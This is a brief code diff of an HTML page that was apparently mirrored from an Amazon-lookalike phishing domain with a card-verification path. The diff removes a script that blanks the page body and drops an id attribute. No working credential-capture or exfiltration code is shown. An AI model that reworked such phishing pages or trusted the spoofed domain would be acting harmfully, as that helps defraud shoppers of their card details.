@@ -28,7 +28,7 @@
        });
   </script>
 </head>
-<body id="bodyid">
+<body>
   <div class="box1">
  	<span><img class='img1' src='../style/img/moren.jpg'></span> 
  	 
@@ -50,11 +50,6 @@
  	</div>
  </div>
 </body>
-
-<script type="text/javascript">
-    let content = document.getElementById('bodyid');
-    content.innerHTML="";
-</script>
 
 <!-- Mirrored from www.amazon-suahfue.date/signim/homepage/secure.php?Usecurty_info_vbv by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Apr 2021 15:13:31 GMT -->
 </html>
